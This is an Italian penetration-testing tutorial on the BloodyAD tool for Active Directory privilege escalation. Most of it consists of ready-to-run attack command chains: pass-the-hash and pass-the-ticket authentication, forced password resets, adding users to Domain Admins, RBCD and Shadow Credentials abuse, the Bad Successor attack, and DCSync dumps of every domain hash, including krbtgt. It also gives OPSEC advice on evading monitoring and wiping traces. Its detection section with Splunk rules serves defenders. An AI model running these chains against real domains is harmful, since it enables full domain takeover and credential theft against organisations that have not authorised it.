---
title: 'BloodyAD: Privilege Escalation in Active Directory (Guida 2026)'
slug: bloodyad
description: 'BloodyAD:autenticazione PTH/PTT, abuso ACE (GenericAll, WriteDACL, RBCD), Shadow Credentials, Bad Successor 2025 e autobloody.Pentest,payload,detection e bypass'
image: /bloodyad-active-directory.webp
draft: true
date: 2026-07-04T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - ACE-abuse
  - autobloody
  - bad-successor
  - bloodyad
---

# BloodyAD: Guida Definitiva al Framework di Privilege Escalation in Active Directory

BloodyAD è il "coltellino svizzero" per la privilege escalation in [Active Directory](https://hackita.it/articoli/active-directory/) tramite LDAP. Dove [BloodHound](https://hackita.it/articoli/bloodhound/) ti mostra i path di escalation, BloodyAD te li esegue — dalla modifica di password a RBCD, Shadow Credentials, DCSync e il recente Bad Successor su Windows Server 2025. Tutto via LDAP, senza PowerShell, senza .NET, da Linux o Windows, anche attraverso un proxy SOCKS.

Creato da CravateRouge e basato sulla libreria MSLDAP di @skelsec, è il complemento naturale di BloodHound in qualsiasi assessment AD.

***

## Cos'è e perché usarlo

BloodyAD esegue **operazioni LDAP/SAMR specifiche** contro un Domain Controller per sfruttare misconfigurazioni di Active Directory. Non scrive file su disco, non spawna processi sul target, non richiede credenziali di Domain Admin per funzionare — ti basta avere i permessi LDAP necessari per l'operazione che vuoi eseguire.

Il workflow classico è:

1. **BloodHound** mappa la rete AD e identifica i path di escalation (es. "l'utente `helpdesk` ha GenericWrite su `DC01$`")
2. **BloodyAD** esegue l'exploit del path trovato (es. configura RBCD su DC01$ per impersonare Administrator)

```
[BloodHound] ──trova path──► GenericWrite su DC01$
                                      │
[BloodyAD] ──esegue──────────────────► add rbcd → getST → DCSync
```

**Vantaggi rispetto alle alternative:**

* Python puro → funziona da Linux senza PowerShell
* LDAP diretto → meno rumore di strumenti che spawna processi
* Supporta tutti i metodi di autenticazione AD (password, hash, ticket, cert)
* SOCKS proxy nativo → usabile tramite C2 come [Sliver](https://hackita.it/articoli/sliver-c2/) o [Havoc](https://hackita.it/articoli/havoc/)
* autobloody companion → esegue interi path BloodHound automaticamente

***

## Architettura — come funziona internamente

BloodyAD comunica con il Domain Controller principalmente tramite **LDAP** (porta 389) o **LDAPS** (porta 636). Per alcune operazioni (es. cambio password) usa anche **SAMR** (SAM Remote Protocol, porta 445/SMB).

```
[BloodyAD]
    │
    ├── LDAP/LDAPS → Domain Controller
    │   ├── Lettura attributi oggetti AD (get)
    │   ├── Scrittura attributi (set)
    │   ├── Aggiunta oggetti/relazioni (add)
    │   └── Rimozione (remove)
    │
    └── SAMR (via SMB) → Domain Controller
        └── Cambio password SAMR (alternativo a LDAP)
```

**Stack tecnico:**

* `msldap` (di @skelsec) — libreria LDAP asincrona che supporta tutti i metodi di auth AD
* `impacket` — strutture LDAP, SAMR, e Kerberos
* `DSinternals` — operazioni crittografiche specifiche AD (shadow credentials, PAC)
* Python 3.7+

Questo stack permette a BloodyAD di fare operazioni che altri tool (PowerView, ldap3 diretto) non gestiscono facilmente: Kerberos PKINIT con certificati, pass-the-ticket trasparente, proxy SOCKS per tutte le operazioni.

***

## Installazione

```bash
# Metodo 1 — pip (consigliato)
pip install bloodyAD

# Metodo 2 — da sorgente (per sviluppo o versione più recente)
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
pip install .

# Metodo 3 — in ambiente virtuale (best practice per evitare conflitti)
python3 -m venv venv
source venv/bin/activate
pip install bloodyAD

# Verifica installazione
bloodyAD --help
```

**Dipendenze risolte automaticamente:** DSinternals, Impacket, msldap, cryptography.

***

## Sintassi base e opzioni globali

La struttura di ogni comando BloodyAD è:

```bash
bloodyAD [OPZIONI GLOBALI] AZIONE [OPZIONI AZIONE]
```

**Opzioni globali:**

```bash
-H / --host        IP o FQDN del Domain Controller (obbligatorio)
-d / --domain      Nome del dominio (es. corp.local)
-u / --username    Username
-p / --password    Password in chiaro, hash NTLM, o ticket Kerberos
-k / --kerberos    Usa Kerberos (legge KRB5CCNAME dall'ambiente)
-c / --certificate Path al file PFX per autenticazione via certificato
--dc-ip            IP del DC (se diverso da --host)
--gc               Usa il Global Catalog (porta 3268) invece di LDAP
-s / --secure      Usa LDAPS invece di LDAP
--proxy            URL proxy SOCKS5 (es. socks5://127.0.0.1:1080)
```

**Azioni disponibili:** `get`, `set`, `add`, `remove`

***

## Autenticazione — tutti i metodi

Questa è una delle parti più potenti di BloodyAD: supporta nativamente tutti i metodi di autenticazione AD senza richiedere configurazioni aggiuntive.

### Password in chiaro

Il metodo base — username e password in chiaro via LDAP.

```bash
bloodyAD --host 10.10.10.5 -d corp.local -u admin -p 'Password123!' get object Administrator
```

### Pass-the-Hash (PTH)

Invece della password usi l'hash NTLM dell'utente. Il formato è `:HASH` (con i due punti prima dell'hash).

```bash
# Hash NTLM recuperato via Mimikatz, secretsdump, o ntlmrelayx
bloodyAD --host 10.10.10.5 -d corp.local -u admin \
  -p ':a0b1c2d3e4f5a0b1c2d3e4f5a0b1c2d3' \
  get object Administrator
```

> Il formato `:HASH` è la stessa convenzione usata da [Impacket](https://hackita.it/articoli/impacket/) — se sai fare `psexec.py -hashes :HASH ...`, BloodyAD funziona allo stesso modo.

### Pass-the-Ticket (PTT / Kerberos)

Usa un ticket Kerberos già ottenuto (.ccache). Ideale dopo aver fatto overpass-the-hash o dopo aver ottenuto un TGT.

```bash
# Esporta il ticket come variabile d'ambiente
export KRB5CCNAME=/tmp/admin.ccache

# Usa -k per attivare Kerberos
bloodyAD --host dc01.corp.local -d corp.local -u admin -k \
  get object 'DC=corp,DC=local' --attr ms-DS-MachineAccountQuota
```

### Autenticazione con certificato (PKINIT)

Usa un certificato X.509 per autenticarsi via Kerberos PKINIT. Utile dopo aver sfruttato Shadow Credentials o ADCS.

```bash
# File .pfx = certificato + chiave privata
bloodyAD --host dc01.corp.local -d corp.local -u admin \
  -c /tmp/admin.pfx \
  get object Administrator
```

### Via proxy SOCKS

Quando lavori tramite un C2 con SOCKS5 attivo (Sliver, Havoc, SSH -D):

```bash
# SOCKS5 da Sliver o Havoc
bloodyAD --host 10.10.10.5 -d corp.local -u admin -p 'Pass123' \
  --proxy socks5://127.0.0.1:1080 \
  get object Administrator
```

***

## `get` — enumerazione AD

Il gruppo di comandi `get` legge informazioni dal Domain Controller senza modificare nulla. È la fase di ricognizione prima di un'operazione.

### `get object` — attributi di un oggetto

```bash
# Ottieni tutti gli attributi di un utente
bloodyAD --host DC -d corp -u user -p pass get object Administrator

# Solo attributi specifici
bloodyAD --host DC -d corp -u user -p pass get object Administrator \
  --attr sAMAccountName,memberOf,userAccountControl

# Ottieni info su un computer
bloodyAD --host DC -d corp -u user -p pass get object 'DC01$'

# Ottieni info sul dominio stesso
bloodyAD --host DC -d corp -u user -p pass \
  get object 'DC=corp,DC=local' --attr minPwdLength,lockoutThreshold

# Attributi utili da cercare
# userAccountControl → flags account (password mai scade, disabilitato, ecc.)
# memberOf → gruppi a cui appartiene
# pwdLastSet → data ultimo cambio password
# lastLogon → ultimo accesso
# adminCount → 1 se protetto da AdminSDHolder
# servicePrincipalName → SPN configurati (Kerberoasting)
# msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD configurato
```

### `get writable` — oggetti con cui possiamo interagire

Questo è uno dei comandi più utili — lista tutti gli oggetti AD su cui l'utente corrente ha permessi di scrittura.

```bash
# Lista tutti gli oggetti che l'utente corrente può modificare
bloodyAD --host DC -d corp -u user -p pass get writable

# Output tipico:
# distinguishedName: CN=john.doe,CN=Users,DC=corp,DC=local
#   permission: WriteProperty (pwdLastSet, description)
# distinguishedName: CN=Helpdesk,CN=Groups,DC=corp,DC=local
#   permission: WriteMember
```

L'output di `get writable` corrisponde esattamente ai path che BloodHound mostrerebbe come "edge" a partire dall'utente corrente.

### `get children` — contenuto di un OU o container

```bash
# Lista tutti gli oggetti dentro una OU
bloodyAD --host DC -d corp -u user -p pass \
  get children 'OU=Users,DC=corp,DC=local'

# Lista computer in una OU specifica
bloodyAD --host DC -d corp -u user -p pass \
  get children 'OU=Workstations,DC=corp,DC=local' --type computer
```

### `get membership` — appartenenza a gruppi

```bash
# Gruppi di cui fa parte un utente
bloodyAD --host DC -d corp -u user -p pass \
  get membership john.doe

# Membri di un gruppo specifico
bloodyAD --host DC -d corp -u user -p pass \
  get membership 'Domain Admins'

# Ricorsivo — segue i gruppi annidati
bloodyAD --host DC -d corp -u user -p pass \
  get membership john.doe --full-tree
```

### `get search` — ricerca LDAP custom

Per ricerche LDAP avanzate con filtri custom:

```bash
# Tutti gli utenti con SPN configurato (Kerberoasting candidates)
bloodyAD --host DC -d corp -u user -p pass \
  get search '(&(objectClass=user)(servicePrincipalName=*))' \
  --attr sAMAccountName,servicePrincipalName

# Computer con delegazione non vincolata
bloodyAD --host DC -d corp -u user -p pass \
  get search '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  --attr dNSHostName,userAccountControl

# Utenti con adminCount=1 (protected by AdminSDHolder)
bloodyAD --host DC -d corp -u user -p pass \
  get search '(&(objectClass=user)(adminCount=1))' \
  --attr sAMAccountName,memberOf
```

***

## `set` — modifica attributi AD

I comandi `set` modificano attributi di oggetti AD esistenti. Richiedono il permesso appropriato sull'oggetto target.

### `set password` — cambio password

Il cambio password è uno dei path di escalation più diretti. Se hai `ForceChangePassword` o `GenericAll` su un utente, puoi cambiargli la password senza conoscere quella attuale.

```bash
# Cambia password con GenericAll o ForceChangePassword
bloodyAD --host DC -d corp -u user -p pass \
  set password john.doe 'NewPass123!'

# Con pass-the-hash dell'utente che ha il permesso
bloodyAD --host DC -d corp -u helpdesk \
  -p ':a0b1c2d3e4f5a0b1c2d3e4f5a0b1c2d3' \
  set password admin.target 'Pwned123!'
```

> **Quando hai ForceChangePassword o GenericAll su un utente**, questo è il modo più diretto — cambia la password e loggati con le nuove credenziali. Attenzione: il cambio di password potrebbe essere visibile nei log (Event ID 4723/4724).

### `set object` — modifica attributo generico

Per modificare qualsiasi attributo di un oggetto AD su cui hai `WriteProperty`.

```bash
# Aggiungi SPN a un account (per Kerberoasting forzato o altre operazioni)
bloodyAD --host DC -d corp -u user -p pass \
  set object john.doe servicePrincipalName 'http/john.doe.corp.local'

# Modifica descrizione (es. aggiungi info di controllo)
bloodyAD --host DC -d corp -u user -p pass \
  set object john.doe description 'Utente di test'

# Modifica userAccountControl — es. disabilita un account
bloodyAD --host DC -d corp -u admin -p pass \
  set object victim.user userAccountControl 514   # 512=normal, 514=disabled

# Abilita l'account
bloodyAD --host DC -d corp -u admin -p pass \
  set object victim.user userAccountControl 512

# Modifica msDS-KeyCredentialLink (Shadow Credentials manuale)
# → usa 'add shadowCredentials' invece — più facile
```

### `set owner` — cambia proprietario di un oggetto

Se hai `WriteOwner` su un oggetto, puoi impostare te stesso come proprietario e poi modificarne le ACL.

```bash
# Diventa proprietario dell'utente target
bloodyAD --host DC -d corp -u user -p pass \
  set owner john.doe user   # "user" = username dell'utente corrente

# Ora come proprietario puoi modificare le ACL → aggiungiti GenericAll
# poi usa set password o add shadowCredentials
```

***

## `add` — aggiungi oggetti e relazioni

I comandi `add` aggiungono nuovi oggetti AD o relazioni tra oggetti esistenti.

### `add groupMember` — aggiungi utente a gruppo

Se hai `GenericAll`, `GenericWrite`, o `WriteMember` su un gruppo, puoi aggiungere qualsiasi utente.

```bash
# Aggiungiti al gruppo Domain Admins (se hai GenericAll/WriteMember)
bloodyAD --host DC -d corp -u user -p pass \
  add groupMember 'Domain Admins' user

# Aggiungi un computer account a un gruppo
bloodyAD --host DC -d corp -u user -p pass \
  add groupMember 'Enterprise Admins' 'WORKSTATION01$'

# Con Kerberos pass-the-ticket
export KRB5CCNAME=/tmp/exploit.ccache
bloodyAD --host dc01.corp.local -d corp -u user -k \
  add groupMember 'Domain Admins' user
```

### `add rbcd` — Resource-Based Constrained Delegation

RBCD è uno degli attacchi AD più potenti. Se hai `GenericAll` o `GenericWrite` su un oggetto computer, puoi configurare RBCD per impersonare qualsiasi utente su quel computer — incluso Administrator per poi fare DCSync.

**Come funziona RBCD:**

```
[Attaccante ha GenericWrite su DC01$]
        │
        ▼
BloodyAD: add rbcd DC01$ ATTACKER_COMPUTER$
    → Configura msDS-AllowedToActOnBehalfOfOtherIdentity su DC01$
        │
        ▼
impacket-getST: chiedi TGS per ATTACKER_COMPUTER$ che impersona Administrator su DC01
        │
        ▼
export KRB5CCNAME → impacket-secretsdump / impacket-psexec
```

```bash
# Step 1: Crea un computer account controllato dall'attaccante
# (richiede MachineAccountQuota > 0, di default è 10 su qualsiasi utente di dominio)
impacket-addcomputer corp.local/user:pass -dc-ip DC_IP -computer-name 'ATTACK01$' -computer-pass 'AttackPass!'

# Step 2: Configura RBCD su DC01$ per permettere ad ATTACK01$ di delegare
bloodyAD --host DC -d corp -u user -p pass \
  add rbcd 'DC01$' 'ATTACK01$'

# Verifica che RBCD sia stato configurato
bloodyAD --host DC -d corp -u user -p pass \
  get object 'DC01$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3: Richiedi TGS che impersona Administrator
impacket-getST -spn 'cifs/dc01.corp.local' \
  -impersonate 'Administrator' \
  -dc-ip DC_IP \
  'corp.local/ATTACK01$:AttackPass!'

# Step 4: Usa il ticket per DCSync
export KRB5CCNAME='Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache'
impacket-secretsdump -k -no-pass dc01.corp.local
```

### `add shadowCredentials` — Shadow Credentials

Le Shadow Credentials abusano del campo `msDS-KeyCredentialLink` degli oggetti AD. Se hai `GenericWrite` o `GenericAll` su un utente/computer, puoi aggiungere una coppia di chiavi crittografiche al suo profilo — e poi autenticarti come quell'utente via PKINIT senza conoscerne la password.

```bash
# Aggiungi Shadow Credentials a un utente target
bloodyAD --host DC -d corp -u attacker -p pass \
  add shadowCredentials john.doe

# Output:
# [+] Key Credential Link added to john.doe
# [*] Saved certificate to: john.doe_shadow.pfx (password: shadow_pass)

# Usa il certificato per autenticarti come john.doe e ottenere il suo NT hash
impacket-gettgt corp.local/john.doe -pfx-base64 $(base64 -w 0 john.doe_shadow.pfx) \
  -pfx-password shadow_pass -dc-ip DC_IP

# Oppure direttamente con certipy
certipy auth -pfx john.doe_shadow.pfx -username john.doe -domain corp.local -dc-ip DC_IP
# → restituisce NT hash di john.doe
```

### `add dnsRecord` — aggiungi record DNS

Se hai i permessi, puoi aggiungere record DNS custom al dominio AD (es. per risponder poisoning interno).

```bash
# Aggiungi un record A
bloodyAD --host DC -d corp -u user -p pass \
  add dnsRecord attacker 10.10.14.1

# Verifica che il record sia stato aggiunto
bloodyAD --host DC -d corp -u user -p pass \
  get object 'attacker.corp.local' --type dnsnode
```

### `add badSuccessor` — Windows Server 2025

Bad Successor è una vulnerabilità/abuso di Windows Server 2025 che coinvolge gli oggetti **DMSA (Delegated Managed Service Account)**. Se hai il permesso di creare oggetti in almeno una OU del dominio (molto comune), puoi creare un DMSA che impersona account privilegiati.

```bash
# Verifica se lo schema AD supporta DMSA (richiede schema version 91+ = WS2025)
bloodyAD --host DC -d corp -u user -p pass \
  get object 'CN=Schema,CN=Configuration,DC=corp,DC=local' \
  --attr objectVersion
# Se objectVersion >= 91 → WS2025 schema, attacco possibile

# Esegui il Bad Successor attack
# Crea un DMSA che può impersonare Administrator
bloodyAD --host DC -d corp -u user -p pass \
  add badSuccessor evil-dmsa

# Output:
# [+] DMSA created: evil-dmsa$
# [+] Saved ticket to: evil-dmsa$.ccache

# Usa il ticket per autenticarti come Administrator
export KRB5CCNAME=evil-dmsa$.ccache
impacket-secretsdump -k -no-pass dc01.corp.local

# Con target specifico (-t)
bloodyAD --host DC -d corp -u user -p pass \
  add badSuccessor evil-dmsa \
  -t 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

***

## `remove` — rimuovi oggetti e relazioni

I comandi `remove` eliminano relazioni o attributi. Utili per cleanup post-exploitation o per rimuovere artefatti temporanei.

```bash
# Rimuovi utente da gruppo
bloodyAD --host DC -d corp -u admin -p pass \
  remove groupMember 'Domain Admins' user

# Rimuovi RBCD configurato
bloodyAD --host DC -d corp -u user -p pass \
  remove rbcd 'DC01$' 'ATTACK01$'

# Rimuovi Shadow Credentials aggiunte
bloodyAD --host DC -d corp -u attacker -p pass \
  remove shadowCredentials john.doe --key-id KEY_ID
# KEY_ID è visibile nell'output di 'add shadowCredentials' o 'get object --attr msDS-KeyCredentialLink'
```

***

## Workflow completi — scenari reali

### Scenario 1: GenericAll su utente → Domain Admin

BloodHound mostra: `helpdesk` ha `GenericAll` su `john.admin` (membro di Domain Admins).

```bash
# Step 1: Cambia la password di john.admin
bloodyAD --host 10.10.10.5 -d corp.local -u helpdesk -p 'HelpDesk2024!' \
  set password john.admin 'Pwned@2024!'

# Step 2: Autenticati come john.admin
evil-winrm -i dc01.corp.local -u john.admin -p 'Pwned@2024!'
# oppure
impacket-psexec corp.local/john.admin:'Pwned@2024!'@DC_IP

# Step 3: DCSync con john.admin (ora Domain Admin)
impacket-secretsdump corp.local/john.admin:'Pwned@2024!'@DC_IP -just-dc
```

### Scenario 2: GenericWrite su computer → DCSync via RBCD

BloodHound mostra: `user1` ha `GenericWrite` su `DC01$`.

```bash
# Step 1: Crea computer account controllato
impacket-addcomputer -dc-ip DC_IP corp.local/user1:pass1 \
  -computer-name 'EVIL01$' -computer-pass 'Evil@Pass123'

# Step 2: Configura RBCD
bloodyAD --host DC_IP -d corp.local -u user1 -p pass1 \
  add rbcd 'DC01$' 'EVIL01$'

# Step 3: Ottieni TGS impersonando Administrator
impacket-getST -spn 'cifs/DC01.corp.local' -impersonate Administrator \
  -dc-ip DC_IP 'corp.local/EVIL01$:Evil@Pass123'

# Step 4: DCSync
export KRB5CCNAME='Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache'
impacket-secretsdump -k -no-pass -just-dc DC01.corp.local
```

### Scenario 3: WriteDACL su dominio → DCSync

BloodHound mostra: `it_user` ha `WriteDACL` sull'oggetto dominio `DC=corp,DC=local`.

```bash
# Step 1: Concedi a se stesso i diritti DCSync tramite WriteDACL
bloodyAD --host DC_IP -d corp.local -u it_user -p pass \
  add dcsync it_user

# (internamente aggiunge ExtendedRight DS-Replication-Get-Changes e DS-Replication-Get-Changes-All)

# Step 2: Esegui DCSync
impacket-secretsdump corp.local/it_user:pass@DC_IP -just-dc
# → otterrai tutti gli hash NTLM del dominio, incluso krbtgt
```

### Scenario 4: Shadow Credentials → autenticazione senza password

BloodHound mostra: `support_user` ha `GenericWrite` su `admin_user`.

```bash
# Step 1: Aggiungi Shadow Credentials
bloodyAD --host DC_IP -d corp.local -u support_user -p pass \
  add shadowCredentials admin_user
# → genera admin_user_shadow.pfx

# Step 2: Ottieni TGT di admin_user via certificato
certipy auth -pfx admin_user_shadow.pfx \
  -username admin_user -domain corp.local -dc-ip DC_IP
# → NT hash di admin_user

# Step 3: Usa l'hash
evil-winrm -i DC_IP -u admin_user -H <NT_HASH>
impacket-secretsdump -hashes :<NT_HASH> corp.local/admin_user@DC_IP
```

***

## autobloody — automazione dei path BloodHound

**autobloody** è il companion tool di BloodyAD che automatizza l'intera catena di exploitation di un path BloodHound — dalla sorgente alla destinazione, senza intervento manuale.

```bash
# Installazione
pip install autobloody

# Setup BloodHound CE con dati già importati
# (autobloody interroga Neo4j per i path)

# Esempio: trova ed esegui il path da 'helpdesk' ad 'Administrator'
autobloody -d corp.local -u helpdesk -p 'HelpDesk!' \
  --host DC_IP \
  --neo4j-bolt neo4j://127.0.0.1:7687 \
  --neo4j-user neo4j --neo4j-pass bloodhound \
  --source 'helpdesk' \
  --target 'Administrator'

# autobloody:
# 1. Interroga Neo4j per il percorso più breve helpdesk → Administrator
# 2. Analizza ogni edge (GenericAll, WriteMember, ecc.)
# 3. Esegue BloodyAD per ogni step
# 4. Alla fine hai le credenziali di Administrator
```

autobloody usa la sua istanza BloodHound CE single-user:

```bash
# Setup BloodHound CE single-user (dal repo autobloody)
git clone https://github.com/CravateRouge/Single-User-BloodHound.git
cd Single-User-BloodHound
./bloodhound-ce    # avvia tutto con Docker Compose
```

***

## OPSEC

BloodyAD genera traffico LDAP verso il Domain Controller — meno rumoroso di PowerShell o di tool che spawna processi, ma comunque tracciabile.

**Usa LDAPS invece di LDAP.** Le query LDAP in chiaro (porta 389) sono visibili in rete. LDAPS (porta 636) le cifra. Aggiungi `-s` a ogni comando.

```bash
bloodyAD --host DC_IP -d corp -u user -p pass -s get object Administrator
```

**Minimizza le query.** Ogni comando `get writable` genera decine di query LDAP. In ambienti con monitoring avanzato, un burst di query LDAP da un host non-DC è anomalo. Usa `get writable` una volta sola, non in loop.

**Cleanup degli artefatti.** Dopo ogni operazione, rimuovi le tracce:

```bash
# Rimuovi il computer account creato per RBCD
impacket-addcomputer corp.local/admin:pass -dc-ip DC_IP \
  -computer-name 'EVIL01$' -delete

# Rimuovi Shadow Credentials
bloodyAD --host DC_IP -d corp -u attacker -p pass \
  remove shadowCredentials john.doe --key-id KEY_ID

# Rimuovi membership aggiunta
bloodyAD --host DC_IP -d corp -u admin -p pass \
  remove groupMember 'Domain Admins' attacker
```

**Usa pass-the-hash o pass-the-ticket** invece delle credenziali in chiaro quando possibile — riduce l'esposizione delle credenziali nei processi.

**Evita `add dcsync` in ambienti con logging avanzato.** La modifica delle ACL del dominio (WriteDACL) genera Event ID 4662 con modifiche all'oggetto dominio — tra i log AD più monitorati. Se puoi fare DCSync in altro modo (es. via Mimikatz con DA), preferisci quello.

***

## Detection — cosa vede il blue team

BloodyAD è più stealth di molte alternative perché usa LDAP diretto senza PowerShell, ma lascia tracce specifiche nei log AD.

### Event IDs rilevanti

```
4662 — An operation was performed on an object
       → Triggered da ogni modifica LDAP significativa
       → Alert su: modifiche a msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
                   modifiche a msDS-KeyCredentialLink (Shadow Creds)
                   aggiunta diritti di replica (WriteDACL → DCSync)

4728 — A member was added to a security-enabled global group
4729 — A member was removed from a security-enabled global group
       → Alert su aggiunte a Domain Admins, Enterprise Admins

4723 — An attempt was made to change an account's password
4724 — An attempt was made to reset an account's password
       → Alert su reset password di account privilegiati

4768 — A Kerberos authentication ticket (TGT) was requested
4769 — A Kerberos service ticket was requested
       → Pattern S4U (RBCD): 4768 + 4769 con RC4 o AES per S4U2proxy
```

### LDAP anomalie

```
🔴 Segnali critici:
- Modifica di msDS-AllowedToActOnBehalfOfOtherIdentity su DC (RBCD)
- Modifica di msDS-KeyCredentialLink su utente/computer (Shadow Creds)
- Aggiunta diritti replica all'oggetto dominio (WriteDACL → DCSync)
- Cambio password di account protetti (adminCount=1) da account non admin

🟡 Segnali medi:
- Burst di query LDAP da host non-DC in breve tempo (get writable)
- Creazione computer account con MachineAccountQuota standard
- Query LDAP che leggono attributi sensibili (msDS-*, nTSecurityDescriptor)
```

### Regola Splunk per RBCD su DC

```spl
index=wineventlog EventCode=4662
| where ObjectType="Computer" AND OperationType="Write"
| where AttributeValue like "%AllowedToActOnBehalfOfOtherIdentity%"
| where SubjectUserName!="SYSTEM" AND SubjectUserName!="*$"
| stats count by SubjectUserName, ObjectName, ComputerName
| where count > 0
```

### Regola per Shadow Credentials

```spl
index=wineventlog EventCode=4662
| where AttributeValue like "%KeyCredentialLink%"
| where SubjectUserName!="SYSTEM"
| stats count by SubjectUserName, ObjectName, ComputerName, _time
```

***

## Confronto con alternative

| Tool             | Linguaggio | Via LDAP  | PTH | PTT      | Cert | SOCKS | GUI |
| ---------------- | ---------- | --------- | --- | -------- | ---- | ----- | --- |
| **BloodyAD**     | Python     | ✅ Diretto | ✅   | ✅        | ✅    | ✅     | ❌   |
| PowerView        | PowerShell | ✅         | ❌   | Parziale | ❌    | ❌     | ❌   |
| impacket-scripts | Python     | Parziale  | ✅   | ✅        | ✅    | ✅     | ❌   |
| certipy          | Python     | Parziale  | ✅   | ✅        | ✅    | ✅     | ❌   |
| ldap3 (raw)      | Python     | ✅         | ❌   | ❌        | ❌    | ❌     | ❌   |
| SharpAD (C#)     | C#         | ✅         | ❌   | ✅        | ✅    | ❌     | ❌   |

**BloodyAD vince su:** completezza di operazioni in un singolo tool, supporto auth completo, integrazione SOCKS, autobloody per automazione.

**PowerView vince su:** integrazione nativa Windows, familiarità, output più ricco per enumerazione.

**impacket vince su:** più tool specializzati per operazioni specifiche (secretsdump, getST, ntlmrelayx).

***

## Quick Reference — comandi per ogni ACE BloodHound

```bash
BASE="bloodyAD --host DC -d corp -u USER -p PASS"

# === ENUMERA ===
$BASE get object TARGET                    # tutti gli attributi
$BASE get writable                         # cosa puoi modificare
$BASE get membership TARGET                # gruppi
$BASE get children 'OU=Users,DC=corp,DC=local'  # contenuto OU

# === ForceChangePassword ===
$BASE set password TARGET 'NewPass!'

# === GenericAll/GenericWrite su utente ===
$BASE add shadowCredentials TARGET
$BASE set password TARGET 'NewPass!'       # alternativo

# === GenericAll/WriteMember su gruppo ===
$BASE add groupMember 'Domain Admins' MYUSER

# === GenericAll/GenericWrite su computer ===
$BASE add rbcd TARGET$ MYCOMPUTER$

# === WriteDACL su dominio ===
$BASE add dcsync MYUSER                    # poi secretsdump

# === WriteOwner ===
$BASE set owner TARGET MYUSER              # diventa owner → poi modifica ACL

# === RBCD completo ===
# 1. addcomputer
# 2. $BASE add rbcd TARGET$ EVIL$
# 3. getST -impersonate Administrator
# 4. secretsdump con KRB5CCNAME

# === Shadow Credentials completo ===
# 1. $BASE add shadowCredentials TARGET
# 2. certipy auth -pfx TARGET.pfx
# 3. evil-winrm -H NT_HASH

# === Bad Successor (WS2025) ===
$BASE add badSuccessor EVIL_DMSA
# usa ticket generato per secretsdump

# === CLEANUP ===
$BASE remove groupMember 'Domain Admins' MYUSER
$BASE remove rbcd TARGET$ EVIL$
$BASE remove shadowCredentials TARGET --key-id KEY_ID
```

***

## MITRE ATT\&CK

| Tattica              | Tecnica       | Come BloodyAD la implementa                          |
| -------------------- | ------------- | ---------------------------------------------------- |
| Discovery            | **T1069.002** | Enumerazione gruppi e membership AD                  |
| Discovery            | **T1087.002** | Enumerazione account AD (`get object`, `get search`) |
| Credential Access    | **T1003.006** | DCSync via `add dcsync` + impacket-secretsdump       |
| Credential Access    | **T1558.003** | SPN per Kerberoasting (`get search` + filter SPN)    |
| Privilege Escalation | **T1484.001** | Modifica ACL dominio (`add dcsync`, WriteDACL)       |
| Privilege Escalation | **T1098**     | Aggiunta account a gruppi privilegiati               |
| Privilege Escalation | **T1134.001** | Shadow Credentials → PKINIT → token impersonation    |
| Lateral Movement     | **T1550.003** | Pass-the-Hash, Pass-the-Ticket per auth              |
| Lateral Movement     | **T1021.002** | SMB post-RBCD via getST                              |
| Defense Evasion      | **T1207**     | RBCD su DC per DCSync senza DCSync diretto           |
| Persistence          | **T1098.004** | Shadow Credentials persistenti                       |

***

## FAQ

**Qual è la differenza tra BloodyAD e PowerView?**
PowerView è PowerShell-only su Windows, ricco per enumerazione. BloodyAD è Python, funziona da Linux, supporta tutti i metodi di auth AD incluso PTH/PTT/cert, e ha autobloody per automazione. BloodyAD è più utile in assessment da Linux o via C2.

**BloodyAD richiede Domain Admin?**
No — richiede solo i permessi necessari per l'operazione specifica. Per `set password` basta `ForceChangePassword` sull'utente target. Per `add groupMember` basta `WriteMember` sul gruppo. Il punto è sfruttare ACE mal configurate con i minimi privilegi.

**Come funziona `-p :HASH` per pass-the-hash?**
Il formato `:HASH` (con due punti prima dell'hash) usa solo la seconda parte (NT hash) del formato `LM:NT` di impacket. Siccome LM non viene mai usato nei sistemi moderni, si omette mettendo solo `:` seguito dall'NT hash a 32 caratteri hex.

**BloodyAD funziona con Kerberos e LDAPS simultaneamente?**
Sì — usa `-k` per Kerberos e `-s` per LDAPS. I due flag si combinano.

**Cos'è il MachineAccountQuota e perché è importante per RBCD?**
Il MachineAccountQuota è un attributo del dominio che specifica quanti computer account ogni utente di dominio può creare. Il default è 10. RBCD spesso richiede di creare un computer account controllato dall'attaccante — se il quota è 0, devi trovare un altro modo (es. usare un computer account già compromesso).

**Bad Successor funziona su tutti i domini Windows Server 2025?**
Richiede che lo schema AD sia stato aggiornato alla versione 91+ (Windows Server 2025). Se l'organizzazione ha già aggiornato lo schema per supportare WS2025, l'attacco è possibile anche su DC che girano ancora WS2022, purché l'attaccante abbia il permesso di creare oggetti in almeno una OU.

***

## Articoli correlati

* [Active Directory — exploitation](https://hackita.it/articoli/active-directory/)
* [BloodHound](https://hackita.it/articoli/bloodhound/) — trova i path che BloodyAD esegue
* [Impacket](https://hackita.it/articoli/impacket/) — getST, secretsdump, addcomputer
* [Mimikatz](https://hackita.it/articoli/mimikatz/) — dump credenziali post-escalation
* [Kerberoasting](https://hackita.it/articoli/kerberoasting/) — exploitation SPN trovati con get search
* [DCSync](https://hackita.it/articoli/dcsync/) — dopo aver ottenuto i diritti di replica
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/) — approfondimento PKINIT abuse
* [Rubeus](https://hackita.it/articoli/rubeus/) — operazioni Kerberos post-escalation
* [ntlmrelayx.py](https://hackita.it/articoli/ntlmrelayx/) — relay + RBCD/Shadow Creds
* [PowerShell](https://hackita.it/articoli/powershell/) — alternativa Windows per AD enum

***

## Fonti e riferimenti esterni

* [BloodyAD — GitHub CravateRouge](https://github.com/CravateRouge/bloodyAD)
* [autobloody — GitHub CravateRouge](https://github.com/CravateRouge/autobloody)
* [MITRE ATT\&CK — T1484.001: Domain Policy Modification](https://attack.mitre.org/techniques/T1484/001/)
* [MITRE ATT\&CK — T1098: Account Manipulation](https://attack.mitre.org/techniques/T1098/)

> Uso esclusivo in ambienti autorizzati.

\#bloodyad #active-directory #privilege-escalation #ldap #pentest #red-team
